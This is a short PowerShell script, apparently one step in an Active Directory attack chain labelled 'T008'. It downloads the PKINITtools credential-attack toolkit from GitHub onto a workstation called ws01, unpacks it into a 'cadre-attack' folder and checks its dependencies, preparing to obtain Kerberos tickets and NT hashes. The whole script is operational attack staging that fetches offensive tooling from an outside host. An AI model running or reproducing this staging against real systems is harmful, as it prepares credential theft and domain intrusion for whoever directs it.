# Stage PKINITtools (gettgtpkinit.py / getnthash.py) on ws01 and complete T008 chain
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$outDir = 'C:\Tools\cadre-attack'
$ErrorActionPreference = 'Continue'

Write-Output '=== Stage PKINITtools ==='
try {
  Invoke-WebRequest -Uri 'https://codeload.github.com/dirkjanm/PKINITtools/zip/refs/heads/master' -OutFile "$outDir\pkinittools.zip" -UseBasicParsing
  Expand-Archive "$outDir\pkinittools.zip" -DestinationPath "$outDir\pkinittools-src" -Force
  Get-ChildItem "$outDir\pkinittools-src" -Recurse -Filter *.py | ForEach-Object { Write-Output "PYFILE|$($_.Name)|$($_.FullName)" }
} catch {
  Write-Output "STAGE_FAIL|$($_.Exception.Message)"
}

# deps: pyasn1 already present with impacket
python -c "import pyasn1; print('PYASN1_OK')" 2>&1
Write-Output 'STAGE_DONE'
